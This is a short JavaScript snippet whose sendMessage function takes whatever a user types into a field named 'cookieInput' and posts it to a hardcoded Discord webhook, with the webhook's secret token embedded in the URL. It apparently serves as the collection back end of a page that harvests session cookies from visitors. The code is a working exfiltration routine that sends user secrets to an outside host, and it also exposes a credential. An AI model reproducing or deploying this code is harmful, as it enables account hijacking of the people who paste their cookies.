function sendMessage() {
    var message = document.getElementById("cookieInput").value;

    // Construct the request object
    var request = new XMLHttpRequest();
    var webhookURL = "https://discord.com/api/webhooks/1219141130549985341/AqNxaPUJ455CbQUuOWVONDBZrn8xiIq_1vFhw41VuFi3RABBmdkJMwLSt4x-Xfs70gTN";
    var params = JSON.stringify({ content: message });

    // Open a POST request to the webhook URL
    request.open("POST", webhookURL);
    request.setRequestHeader("Content-Type", "application/json");

    // Send the message as JSON payload
    request.send(params);
}

function clearText() {
    document.getElementById("cookieInput").value = "";
}
